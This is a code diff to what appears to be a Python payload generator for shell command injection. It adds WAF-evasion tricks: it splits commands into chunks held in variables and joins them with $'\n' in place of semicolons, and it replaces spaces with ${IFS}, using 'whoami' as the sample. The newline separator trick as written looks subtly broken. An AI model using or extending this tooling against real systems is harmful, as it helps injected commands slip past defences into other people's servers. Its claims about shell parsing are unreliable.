@@ -102,17 +102,22 @@ def var_split(cmd: str) -> str:
     Split command into 2-char chunks assigned to unique variables,
     then concatenate via $a$b$c... for execution.
 
-    Output: _a=wh;_b=oa;_c=mi;$_a$_b$_c
-    Uses chars: $
+    Uses a newline ($'\\n') as the statement separator instead of ';' so the
+    payload survives WAF profiles that block semicolons.
+
+    Output: _a=wh$'\\n'_b=oa$'\\n'_c=mi$'\\n'$_a$_b$_c
+    Uses chars: $, '
     """
     # Split into 2-char chunks
     chunks = [cmd[i:i+2] for i in range(0, len(cmd), 2)]
-    # Variable names: _a, _b, _c ...
+    # Variable names: _a, _b, _c, ...  (up to 26 chunks; extend if needed)
     var_names = [f"_{chr(ord('a') + i)}" for i in range(len(chunks))]
 
-    assignments = ";".join(f"{name}={chunk}" for name, chunk in zip(var_names, chunks))
+    # Newline separator — WAFs rarely block \n; works in bash and sh
+    sep = "$'\\n'"
+    assignments = sep.join(f"{name}={chunk}" for name, chunk in zip(var_names, chunks))
     concatenation = "".join(f"${name}" for name in var_names)
-    return f"{assignments};{concatenation}"
+    return f"{assignments}{sep}{concatenation}"
 
 
 # ---------------------------------------------------------------------------
@@ -150,10 +155,12 @@ def wildcard_expand(cmd: str, warn: bool = True) -> Optional[str]:
 
     glob_path = "/".join(globbed)
 
-    # Append arguments if present
+    # Append arguments if present — separate with ${IFS} (not ${args})
     args = cmd[len(binary):].strip()
     if args:
-        return f"{glob_path}${{{_replace_spaces(args)}}}"
+        # Replace spaces in args with ${IFS} for WAF evasion
+        safe_args = _replace_spaces(args)
+        return f"{glob_path}${{IFS}}{safe_args}"
     return glob_path
 
 
